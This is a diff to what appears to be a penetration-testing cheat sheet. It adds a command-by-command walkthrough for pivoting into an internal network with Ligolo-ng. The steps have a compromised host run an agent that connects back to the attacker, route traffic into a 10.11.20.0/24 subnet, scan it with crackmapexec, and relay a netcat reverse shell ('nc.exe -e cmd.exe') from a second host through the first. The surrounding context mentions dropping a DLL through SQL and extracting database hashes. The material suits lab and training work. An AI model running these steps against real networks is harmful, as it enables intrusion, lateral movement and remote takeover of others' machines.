@@ -840,6 +840,86 @@ SELECT LOAD_FILE('C:\\Users\\Public\\Documents\\poc.dll') INTO DUMPFILE "C:\\Win
 
 https://www.youtube.com/watch?v=DM1B8S80EvQ
 
+https://github.com/nicocha30/ligolo-ng/releases
+
+```
+target internal address
+
+10.11.20.0/24
+
+target A 10.11.20.100
+target B 10.11.20.110
+```
+
+step1. attacker machine
+
+```shell
+$ sudo ip tuntap add user kali mode tun ligolo
+$ sudo ip link set ligolo up
+$ ./proxy -selfcert
+```
+
+step2. target A machine
+
+```powershell
+# 11601 is Ligolo-ng default listen port
+.\agent.exe -connect <attacker ip>:11601 -ignore-cert
+```
+
+step3. attacker machine
+
+new terminal
+
+```shell
+$ sudo ip route add <target internal address>/<Netmask> dev ligolo # 10.11.20.0/24
+$ ip route list
+```
+
+step4. attacker machine
+
+org terminal Ligolo-ng
+
+```shell
+ligolo-ng >> session # select the agent
+ligolo-ng >> start
+```
+
+step5. attacker machine
+
+We can start the scanning now
+
+```shell
+crackmapexec smb <target internal address>/<Netmask>
+```
+
+step6. attacker machine
+
+add listener
+
+```shell
+ligolo-ng >> listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:4444 # for reverse shell
+ligolo-ng >> listener_add --addr 0.0.0.0:1235 --to 127.0.0.1:8000 # for downlaoding file
+ligolo-ng >> listener_list
+```
+
+step7. attacker machine
+
+new terminal
+
+```shell
+$ sudo nc -nlvp 4444
+```
+
+step8. target B machine
+
+```powershell
+.\nc.exe -e cmd.exe <target A machine> <target A machine listen port> 
+# .\nc.exe -e cmd.exe 10.11.20.100 1234
+# 1234 => 4444
+```
+
+step9. attacker machine get a shell
+
 ### :open_file_folder: MSSQL
 
 [Extract hash from MDF](https://github.com/xpn/Powershell-PostExploitation/tree/master/Invoke-MDFHashes)
